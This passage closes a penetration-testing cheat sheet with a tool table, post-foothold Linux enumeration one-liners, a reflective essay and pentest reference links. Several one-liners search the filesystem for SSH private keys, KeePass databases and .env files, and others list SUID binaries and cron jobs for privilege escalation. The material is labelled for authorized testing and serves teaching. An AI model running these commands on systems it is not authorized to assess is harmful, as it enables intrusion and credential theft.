| Banner grab / quick check | `nc target 22`, `curl -I host`, `openssl s_client` |
| Exploitation | `searchsploit`, `metasploit`, Burp Suite, `sqlmap`, `hydra` |
| Initial enumeration on shell | `id`, `sudo -l`, `uname -a`, `ps auxf`, `ss -tulnp`, `cat /etc/passwd` |
| Local privesc | `linpeas.sh`, `find / -perm -4000`, `getcap -r /`, `cat /etc/crontab` |
| Pivoting | `ssh -D 1080`, `chisel`, `ligolo-ng`, `proxychains`, `socat` |
| Cracking | `hashcat`, `john`, `rockyou.txt` |

### Useful enumeration one-liners (authorized testing only)

```bash
# Who am I and what can I do?
id; sudo -l 2>/dev/null; groups

# What's running and listening?
ps auxf; ss -tulnp 2>/dev/null

# What can I read that I shouldn't?
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "fsociety*" 2>/dev/null   # because why not

# What's SUID? What has capabilities?
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# What's writable as me?
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys)"

# Cron jobs?
cat /etc/crontab; ls -la /etc/cron.*

# Kernel and distro version (for exploit DB lookups)
uname -a; cat /etc/os-release

# Network state
ip a; ip route; ss -tulnp 2>/dev/null

# Recently modified files (interesting after a foothold)
find / -mtime -1 -type f 2>/dev/null | head -50
```

---

## 🛡️ Closing Thought

Every major attack pattern, from initial access through exfiltration, compiles down to these primitives. A web RCE is just remote `bash`. A privesc is just `sudo` you weren't supposed to have. Persistence is just `cron` or a service unit. Exfiltration is just `curl` or `scp`. The whole kill chain ends up as shell commands.

Read `ls -l` fluently and you can read an attacker's tracks. Write a 20-line bash script with `set -euo pipefail` and you can write a hardening script. The defenders who win think in the same primitives the attackers use, the same way the best library authors think in the primitives the language gives them, not the abstractions on top.

> *Don't memorize commands. Memorize the questions they answer. The shell is the query language; the OS is the database; and Linux, by design, is willing to answer.*

---

## 📚 Going Deeper

- [GTFOBins](https://gtfobins.github.io). Privesc via misused binaries.
- [LOLBAS](https://lolbas-project.github.io). Windows equivalent.
- [HackTricks](https://book.hacktricks.xyz). Encyclopedic pentest reference.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Payload catalog.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security). Free web pentest course.
- [MITRE ATT&CK](https://attack.mitre.org). Adversary tactics knowledge base.
- [PTES](http://www.pentest-standard.org). The methodology standard.
- `man hier`. The canonical filesystem hierarchy man page.
- `man 7 capabilities`. The modern fine-grained alternative to SUID.
- `man bash`. Yes, the whole thing. At least once.

---

*Made with ☕ between binges of 'Mr. Robot.' Hello, friend.*

*Test only on systems you own or have written permission to assess. Control is an illusion, but accountability is not.*
